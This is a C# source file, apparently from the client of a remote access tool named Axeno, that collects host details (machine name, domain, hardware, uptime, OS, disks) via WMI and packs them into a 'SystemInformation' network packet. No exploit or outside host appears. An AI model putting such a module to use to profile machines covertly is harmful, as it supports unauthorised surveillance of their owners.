using Axeno.Client.Helper;
using Axeno.Client.MessagePack;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Messaging;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Axeno.Client.Networking.Functions.General
{
    internal class GetSystemInfo
    {
        public static byte[] Retrieve()
        {

            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "SystemInformation";
            msgpack.ForcePathObject("Name").AsString = Environment.MachineName;
            msgpack.ForcePathObject("Manafacturer").AsString = GetManafacturer();
            msgpack.ForcePathObject("Model").AsString = GetModel();
            msgpack.ForcePathObject("Domain").AsString = Environment.UserDomainName;
            msgpack.ForcePathObject("Uptime").AsString = $"{GetUpTime().Days.ToString()} day(s), {GetUpTime().Hours.ToString()} hours, {GetUpTime().Minutes.ToString()} minutes";
            msgpack.ForcePathObject("CPU").AsString = GetCPU();
            msgpack.ForcePathObject("GPU").AsString = GetGPU();
            msgpack.ForcePathObject("RAM").AsString = RAMAMOUNT();
            msgpack.ForcePathObject("Monitor").AsString = GetMonitor();
            msgpack.ForcePathObject("OS").AsString = SendInfo.OperatingSystemInfo();
            msgpack.ForcePathObject("OSV").AsString = Environment.OSVersion.Version.ToString();
            msgpack.ForcePathObject("OSarc").AsString = GetArchitecture();
            msgpack.ForcePathObject("Storage").AsString = Storage();

            return msgpack.Encode2Bytes();
        }
        public static string Storage()
        {
            StringBuilder storageitems = new StringBuilder();
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select * from Win32_DiskDrive");
            foreach (ManagementObject obj in searcher.Get())
            {
                string model = obj["Model"].ToString();
                string type = obj["InterfaceType"].ToString();
                ulong sizeBytes = Convert.ToUInt64(obj["Size"]);
                double sizeGB = sizeBytes / (1024 * 1024 * 1024.0);
                storageitems.Append("Model: " + model + ", " + "Type: " + type + ", " + "Size: " + sizeGB.ToString("F2") + " GB.(SPLIT)");
            }
            string s =  storageitems.ToString();
            return s.Substring(0, s.Length - 7);
        }
        public static string RAMAMOUNT()
        {
            double ramSizeGB = 0;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select * from Win32_ComputerSystem");
            foreach (ManagementObject obj in searcher.Get())
            {
                double ramSizeBytes = Convert.ToDouble(obj["TotalPhysicalMemory"]);
                ramSizeGB = ramSizeBytes / (1024 * 1024 * 1024);
                break;
            }
            return ramSizeGB.ToString("F2") + " GB";
        }

        public static string GetArchitecture()
        {
            string architecture = Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit";
            return architecture;
        }
        public static string GetMonitor()
        {
            string monitorName = string.Empty;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select * from Win32_DesktopMonitor");
            foreach (ManagementObject obj in searcher.Get())
            {
                monitorName = obj["Name"].ToString();
                break;
            }
            return monitorName;
        }
        public static string GetGPU()
        {
            string gpuName = string.Empty;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select * from Win32_VideoController");
            foreach (ManagementObject obj in searcher.Get())
            {
                gpuName = obj["Name"].ToString();
                break;
            }
            return gpuName;
        }
        public static string GetCPU()
        {
            string cpuName = "N/A";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select * from Win32_Processor");
            foreach (ManagementObject obj in searcher.Get())
            {
                cpuName = obj["Name"].ToString();
                break;
            }
            return cpuName;
        }
        public static string GetManafacturer()
        {
            ManagementClass mc = new ManagementClass("Win32_ComputerSystem");
            ManagementObjectCollection moc = mc.GetInstances();
            if (moc.Count != 0)
            {
                foreach (ManagementObject mo in mc.GetInstances())
                    return mo["Manufacturer"].ToString();
            }
            return null;
        }
        public static string GetModel()
        {
            ManagementClass mc = new ManagementClass("Win32_ComputerSystem");
            ManagementObjectCollection moc = mc.GetInstances();
            if (moc.Count != 0)
            {
                foreach (ManagementObject mo in mc.GetInstances())
                    return mo["Model"].ToString();
            }
            return null;
        }
        public static TimeSpan GetUpTime()
        {
            return TimeSpan.FromMilliseconds(GetTickCount64());
        }

        [DllImport("kernel32")]
        extern static UInt64 GetTickCount64();
    }
}
